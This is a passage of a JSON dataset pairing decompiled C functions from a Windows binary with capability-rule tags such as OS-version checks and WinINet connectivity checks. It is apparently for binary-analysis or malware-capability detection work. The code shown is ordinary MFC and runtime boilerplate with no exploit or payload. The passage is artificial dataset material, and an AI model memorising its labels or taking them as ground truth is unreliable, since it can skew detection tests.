        "decompiled_code": "\nint32_t * __thiscall fcn.0042353c(int32_t *param_1, int32_t param_2, uint param_3, uint *param_4)\n\n{\n    int32_t iVar1;\n    uint *extraout_ECX;\n    uint *extraout_ECX_00;\n    int32_t unaff_retaddr;\n    uint in_stack_fffffff0;\n    \n    if (param_4 == NULL) {\n        fcn.00401070(0x80004005);\n        param_4 = extraout_ECX;\n    }\n    if ((unaff_retaddr == 0) && (param_2 != 0)) {\n        in_stack_fffffff0 = 0x80070057;\n        fcn.00401070(0x80070057);\n        param_4 = extraout_ECX_00;\n    }\n    iVar1 = (***param_4)(param_2, 2);\n    if (iVar1 == 0) {\n        iVar1 = fcn.004180fd();\n    }\n    *param_1 = iVar1 + 0x10;\n    fcn.004180d6(param_2);\n    fcn.00417a81(*param_1, param_2, in_stack_fffffff0, param_2);\n    return param_1;\n}\n",
        "token_count": 284
    },
    "0042359f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.0042359f(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0042349a();\n    *param_1 = iVar1;\n    if ((*param_2 != 0) && (iVar1 == 0)) {\n        fcn.00401070(0x8007000e);\n    }\n    return param_1;\n}\n",
        "token_count": 104
    },
    "004236a2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004236a2(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    uint32_t uVar3;\n    \n    if (arg_ch == 0) {\n        fcn.0041811c();\n    }\n    else {\n        if (arg_8h == 0) {\n            fcn.00401070(0x80070057);\n        }\n        uVar1 = *(*in_ECX + -0xc);\n        uVar3 = arg_8h - *in_ECX >> 1;\n        iVar2 = fcn.00418270(arg_ch);\n        if (uVar1 < uVar3) {\n            fcn.00417a81(iVar2, arg_ch, arg_8h, arg_ch);\n        }\n        else {\n            fcn.00423303(iVar2, arg_ch, iVar2 + uVar3 * 2);\n        }\n        fcn.004180d6(arg_ch);\n    }\n    return;\n}\n",
        "token_count": 239
    },
    "00423c38": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00423c38(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    \n    if (*(param_1 + 0x10) == 0) {\n        iVar2 = fcn.00436335(param_1 + 0x14, *(param_1 + 0x18), 0xc);\n        iVar1 = *(param_1 + 0x18);\n        puVar3 = iVar2 + -8 + iVar1 * 0xc;\n        while (iVar1 = iVar1 + -1,  -1 < iVar1) {\n            *puVar3 = *(param_1 + 0x10);\n            *(param_1 + 0x10) = puVar3;\n            puVar3 = puVar3 + -3;\n        }\n    }\n    puVar3 = *(param_1 + 0x10);\n    *(param_1 + 0x10) = *puVar3;\n    puVar3[1] = unaff_EDI;\n    *puVar3 = unaff_ESI;\n    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n    if (puVar3 == 0xfffffff8) {\n        fcn.0041901a();\n    }\n    fcn.004018d0();\n    return puVar3;\n}\n",
        "token_count": 327
    },
    "00423eec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00423eec(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = arg_8h;\n    if (arg_8h == 0) {\n        fcn.0041901a();\n    }\n    arg_8h = *(iVar1 + 8);\n    while (arg_8h != 0) {\n        fcn.00423baf(&arg_8h);\n        fcn.00423e83();\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "00423f28": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00423f28(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = arg_8h;\n    if (arg_8h == 0) {\n        fcn.0041901a();\n    }\n    arg_8h = *(iVar1 + 4);\n    while (arg_8h != 0) {\n        fcn.00401150(&arg_8h);\n        fcn.00423eb8();\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "00424235": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00424235(uint arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (arg_ch == 0) {\n        uVar1 = 0;\n    }\n    else {\n        if (arg_10h != 0) {\n            do {\n                arg_10h = arg_10h + -1;\n                arg_ch = fcn.0045c352(arg_ch, arg_14h);\n                if (arg_ch == 0) {\n                    fcn.004016d0();\n                    return 0;\n                }\n                arg_ch = arg_ch + 1;\n            } while (arg_10h != 0);\n        }\n        iVar2 = fcn.0045c352(arg_ch, arg_14h);\n        if (iVar2 == 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(arg_ch);\n        }\n        else {\n            iVar2 = iVar2 - arg_ch;\n        }\n        uVar1 = fcn.00417552(iVar2, iVar2, arg_ch, iVar2);\n        fcn.00417b17(uVar1);\n        fcn.00410110(0xffffffff);\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 301
    },
    "00424384": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.00424384(uint32_t *param_1, int32_t param_2)\n\n{\n    unkuint3 Var2;\n    uint32_t uVar1;\n    \n    Var2 = *0x4ad180 >> 8;\n    if (*0x4ad180 == NULL) {\n        uVar1 = CONCAT31(Var2, 1);\n    }\n    else if ((param_2 == 0) || (*param_1 != 0xffffffff)) {\n        uVar1 = Var2 << 8;\n    }\n    else {\n        uVar1 = (**0x4ad180)(param_2);\n        *param_1 = uVar1;\n        uVar1 = uVar1 & 0xffffff00 | uVar1 != 0xffffffff;\n    }\n    return uVar1;\n}\n",
        "token_count": 182
    },
    "004243ba": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __fastcall fcn.004243ba(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    if (*0x4ad188 == NULL) {\n        return true;\n    }\n    if ((*param_1 != -1) && (param_1[1] == 0)) {\n        iVar1 = (**0x4ad188)(*param_1, param_1 + 1);\n        return iVar1 == 1;\n    }\n    return false;\n}\n",
        "token_count": 105
    },
    "00424722": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00424722(int32_t param_1)\n\n{\n    if (*(param_1 + 0x88) != NULL) {\n        (**(**(param_1 + 0x88) + 0x14))();\n    }\n    if (*(param_1 + 0x94) != 0) {\n        fcn.00436534(\"Settings\", \"PreviewPages\", *(param_1 + 0x94));\n    }\n    return;\n}\n",
        "token_count": 103
    },
    "004248b7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004248b7(uint lpString2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GlobalLock;\n    if (*(in_ECX + 0x74) != 0) {\n        var_4h = in_ECX;\n        iVar2 = (*_sym.imp.KERNEL32.dll_GlobalLock)(*(in_ECX + 0x74));\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(*(iVar2 + 2) + iVar2, lpString2);\n        if ((iVar2 == 0) && (iVar2 = sub.WINSPOOL.DRV_OpenPrinterA(lpString2, &var_4h, 0),  iVar2 != 0)) {\n            if (*(in_ECX + 0x70) != 0) {\n                fcn.00431de8(*(in_ECX + 0x70));\n            }\n            uVar3 = sub.WINSPOOL.DRV_DocumentPropertiesA(0, var_4h, lpString2, 0, 0, 0);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x42, uVar3);\n            *(in_ECX + 0x70) = uVar3;\n            uVar3 = (*pcVar1)(uVar3);\n            iVar2 = sub.WINSPOOL.DRV_DocumentPropertiesA(0, var_4h, lpString2, uVar3, 0, 2);\n            if (iVar2 != 1) {\n                fcn.00431de8(*(in_ECX + 0x70));\n                *(in_ECX + 0x70) = 0;\n            }\n            sub.WINSPOOL.DRV_ClosePrinter(var_4h);\n        }\n    }\n    return;\n}\n",
        "token_count": 427
    },
    "004249cd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_11ch\n\nvoid __cdecl fcn.004249cd(int32_t Locale)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint in_ECX;\n    uint var_11ch;\n    uint lpLibFileName;\n    uint32_t var_4h;\n    \n    var_4h = *0x4a9ec8 ^ &stack0xfffffffc;\n    if (Locale == 0x800) {\n        uVar1 = fcn.0045c78f(&var_11ch, 4, 0x48ca5c);\n        fcn.0040e7f0(uVar1);\n    }\n    else {\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)(Locale, 3, &var_11ch, 4);\n        if (iVar5 == 0) goto code_r0x00424a8d;\n    }\n    puVar2 = fcn.0045924d();\n    uVar1 = *puVar2;\n    puVar2 = fcn.0045924d();\n    *puVar2 = 0;\n    uVar3 = fcn.004595e0(&lpLibFileName, 0x112, 0x111, in_ECX, &var_11ch);\n    piVar4 = fcn.0045924d();\n    if (*piVar4 == 0) {\n        puVar2 = fcn.0045924d();\n        *puVar2 = uVar1;\n    }\n    else {\n        puVar2 = fcn.0045924d();\n        fcn.00418055(*puVar2);\n    }\n    if ((uVar3 != 0xffffffff) && (uVar3 < 0x112)) {\n        (*_sym.imp.KERNEL32.dll_LoadLibraryA)(&lpLibFileName);\n    }\ncode_r0x00424a8d:\n    fcn.004566a8(var_11ch);\n    return;\n}\n",
        "token_count": 463
    },
    "00424a9a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00424a9a(int32_t *param_1)\n\n{\n    if ((*0x4ad184 != NULL) && (*param_1 != -1)) {\n        fcn.004243e7();\n        (**0x4ad184)(*param_1);\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "00424d04": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00424f0e)\n\nvoid fcn.00424d04(void)\n\n{\n    code *pcVar1;\n    char cVar2;\n    code *pcVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    char **in_FS_OFFSET;\n    char *arg_8h;\n    char *pcStack304;\n    char *pcStack300;\n    uint auStack288 [65];\n    uchar uStack28;\n    uchar uStack27;\n    uint32_t uStack8;\n    \n    uStack8 = *0x4a9ec8 ^ auStack288;\n    auStack288[0] = 0x58;\n    fcn.00458e45();\n    pcVar1 = _sym.imp.KERNEL32.dll_GetModuleHandleA;\n    pcStack300 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    arg_8h = pcStack300;\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    if (pcVar3 == NULL) {\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n        if (iVar5 < 0) {\n            pcStack304 = &stack0xfffffec8;\n            arg_8h = NULL;\n            iVar5 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)();\n            if (iVar5 == 0) {\n                iVar5 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)();\n                if (((iVar5 == 0) && (*0x10 == 0x165)) &&\n                   (iVar5 = fcn.0045c89c(),  pcVar1 = _sym.imp.KERNEL32.dll_ConvertDefaultLocale,  iVar5 == 1)) {\n                    (*_sym.imp.KERNEL32.dll_ConvertDefaultLocale)();\n                    (*pcVar1)();\n                    pcStack304 = 0x2;\n                }\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)();\n            }\n        }\n        else {\n            pcStack304 = \"ntdll.dll\";\n            iVar5 = (*pcVar1)();\n            if (iVar5 != 0) {\n                (*_sym.imp.KERNEL32.dll_EnumResourceLanguagesA)();\n            }\n        }\n    }\n    else {\n        (*pcVar3)();\n        pcVar1 = _sym.imp.KERNEL32.dll_ConvertDefaultLocale;\n        (*_sym.imp.KERNEL32.dll_ConvertDefaultLocale)();\n        (*pcVar1)();\n        arg_8h = \"GetSystemDefaultUILanguage\";\n        pcStack304 = 0x2;\n        pcVar4 = (*pcVar4)();\n        if (pcVar4 != NULL) {\n            (*pcVar4)();\n            (*pcVar1)();\n            (*pcVar1)();\n            pcStack304 = 0x4;\n        }\n    }\n    iVar5 = pcStack304 * 4;\n    pcStack304 = pcStack304 + 1;\n    *(&stack0xfffffeac + iVar5) = 0x800;\n    uStack27 = 0;\n    uStack28 = 0;\n    iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)();\n    if (iVar5 != 0) {\n        fcn.00459330();\n        fcn.004242d4();\n        cVar2 = fcn.00424384();\n        if (cVar2 != '\\0') {\n            fcn.004243ba();\n        }\n        iVar5 = 0;\n        if (0 < pcStack304) {\n            do {\n                iVar6 = fcn.004249cd(*(&stack0xfffffeac + iVar5 * 4));\n                if (iVar6 != 0) break;\n                iVar5 = iVar5 + 1;\n            } while (iVar5 < pcStack304);\n        }\n        fcn.00424a9a();\n    }\n    *in_FS_OFFSET = pcStack300;\n    fcn.004566a8(arg_8h);\n    return;\n}\n",
        "token_count": 882
    },
    "004253bb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004253bb(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_4h;\n    \n    fcn.00458e78(0x10);\n    *(unaff_EBP + -4) = 0;\n    fcn.004319c6();\n    fcn.00431c37(0xffffffff);\n    *(unaff_EBP + -4) = 2;\n    if (*(unaff_EBP + 8) == 0) {\n        iVar1 = fcn.0042b82c();\n        if ((iVar1 != 0) && (*(iVar1 + 0x3c) != NULL)) {\n            (**(**(iVar1 + 0x3c) + 0x60))();\n            if (*(iVar1 + 0x3c) != NULL) {\n                (**(**(iVar1 + 0x3c) + 4))(1);\n            }\n            *(iVar1 + 0x3c) = 0;\n        }\n    }\n    bVar2 = *0x4ad250 != 0;\n    *(unaff_EBP + -4) = 4;\n    if (bVar2) {\n        fcn.0043150f(*(unaff_EBP + 8), 0);\n    }\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 327
    },
    "004256cd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.004256cd(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    \n    iVar1 = fcn.0042b82c();\n    if (((*(iVar1 + 4) != 0) && (*param_1 == 0)) && (iVar1 = fcn.00425580(param_1),  iVar1 != 0)) {\n        return 1;\n    }\n    piVar2 = fcn.0041cd8c();\n    piVar4 = piVar2;\n    if (piVar2 != NULL) {\n        piVar4 = piVar2[8];\n    }\n    iVar1 = fcn.0041ebbc(piVar4, param_1);\n    if (iVar1 == 0) {\n        if (piVar2 != NULL) {\n            fcn.0041e67e(*param_1);\n            piVar4 = fcn.0041ffa6();\n            if (piVar4 != piVar2) {\n                uVar3 = (**(*piVar2 + 0x100))(param_1);\n                return uVar3;\n            }\n        }\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 299
    },
    "004257db": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004257db(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint unaff_retaddr;\n    \n    iVar2 = fcn.0042b82c();\n    piVar1 = *(iVar2 + 4);\n    if (piVar1 != NULL) {\n        if (piVar1[0xf] != NULL) {\n            (*piVar1[0xf])(1, 0);\n        }\n        if (param_2 != 0) {\n            (**(*piVar1 + 0x78))();\n        }\n        *(iVar2 + 4) = 0;\n    }\n    fcn.004253bb(0);\n    fcn.0045c92c(unaff_retaddr);\n    return;\n}\n",
        "token_count": 178
    },
    "00425ada": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00425ada(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.0042b7b9();\n    if (*(iVar1 + 0x14) == '\\0') {\n        iVar1 = fcn.0042b206();\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        uVar2 = (*_sym.imp.USER32.dll_SetWindowsHookExA)(0xffffffff, 0x425946, 0, uVar2);\n        *(iVar1 + 0x2c) = uVar2;\n    }\n    return;\n}\n",
        "token_count": 140
    },
    "00426505": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00426505(int32_t param_1)\n\n{\n    if (*(param_1 + 0x58) != 0) {\n    // WARNING: Could not recover jumptable at 0x00426510. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(**(param_1 + 0x58) + 0x24))();\n        return;\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "00426641": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00426641(uint param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = fcn.0041cd8c();\n    if (piVar1 != NULL) {\n        iVar2 = (**(*piVar1 + 0x120))();\n        if ((iVar2 != 0) && (piVar1[0x20] != NULL)) {\n            (**(*piVar1[0x20] + 100))(param_1);\n        }\n    }\n    return;\n}\n",
        "token_count": 121
    },
    "00426720": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00426720(int32_t param_1, uint param_2, uint32_t param_3, int32_t param_4)\n\n{\n    int32_t hWnd;\n    int32_t iVar1;\n    int32_t *piVar2;\n    uchar *lpCaption;\n    int32_t *arg_8h;\n    int32_t iStack280;\n    int32_t iStack276;\n    int32_t iStack272;\n    uchar auStack268 [108];\n    uchar auStack160 [151];\n    uchar uStack9;\n    uint32_t uStack8;\n    \n    uStack8 = *0x4a9ec8 ^ auStack160;\n    fcn.00426641(0);\n    arg_8h = &iStack272;\n    hWnd = fcn.00426675(0);\n    if (hWnd != iStack272) {\n        (*_sym.imp.USER32.dll_EnableWindow)(hWnd, 1);\n    }\n    iStack280 = 0;\n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(hWnd, &iStack280);\n    if ((((hWnd == 0) || (iVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)(),  iStack280 != iVar1)) ||\n        (piVar2 = (*_sym.imp.USER32.dll_SendMessageA)(hWnd, 0x376, 0, 0),  piVar2 == NULL)) &&\n       (piVar2 = NULL,  param_1 != 0)) {\n        piVar2 = param_1 + 0x78;\n    }\n    iStack276 = 0;\n    if ((piVar2 != NULL) && (iStack276 = *piVar2,  param_4 != 0)) {\n        *piVar2 = param_4 + 0x30000;\n    }\n    if ((param_3 & 0xf0) == 0) {\n        if ((param_3 & 0xf) < 2) {\n            param_3 = param_3 | 0x30;\n        }\n        else if ((param_3 & 0xf) - 3 < 2) {\n            param_3 = param_3 | 0x20;\n        }\n    }\n    auStack268[0] = 0;\n    if (param_1 == 0) {\n        lpCaption = auStack268;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, lpCaption, 0x104);\n        if (iVar1 == 0x104) {\n            uStack9 = 0;\n        }\n    }\n    else {\n        lpCaption = *(param_1 + 0x50);\n    }\n    fcn.0041cc5e(hWnd, param_2, lpCaption, param_3);\n    if (piVar2 != NULL) {\n        *piVar2 = iStack276;\n    }\n    if (iStack272 != 0) {\n        (*_sym.imp.USER32.dll_EnableWindow)(iStack272, 1);\n    }\n    fcn.00426641(1);\n    fcn.004566a8(arg_8h);\n    return;\n}\n",
        "token_count": 692
    },
    "00426975": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00426975(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CDialog.0;\n    *(unaff_EBP + -4) = 0;\n    if (extraout_ECX[8] != NULL) {\n        fcn.0041e8bd();\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041f0ac();\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 165
    },
    "004289a8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004289a8(int32_t param_1, uint *param_2)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x18) == 0) {\n        uVar1 = fcn.0041e3b1(\"ImageList_Create\");\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        *(param_1 + 0x18) = uVar1;\n    }\n    *param_2 = *(param_1 + 0x18);\n    return;\n}\n",
        "token_count": 127
    },
    "00428a53": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00428a53(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042abcb(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "00428a89": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00428a89(int32_t param_1, uint *param_2)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x1c) == 0) {\n        uVar1 = fcn.0041e3b1(\"ImageList_Destroy\");\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        *(param_1 + 0x1c) = uVar1;\n    }\n    *param_2 = *(param_1 + 0x1c);\n    return;\n}\n",
        "token_count": 130
    },
    "00428b28": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00428b28(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042abcb(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "00428b5e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00428b5e(int32_t param_1, uint *param_2)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x58) == 0) {\n        uVar1 = fcn.0041e3b1(\"ImageList_LoadImageA\");\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        *(param_1 + 0x58) = uVar1;\n    }\n    *param_2 = *(param_1 + 0x58);\n    return;\n}\n",
        "token_count": 130
    },
    "00428c0f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
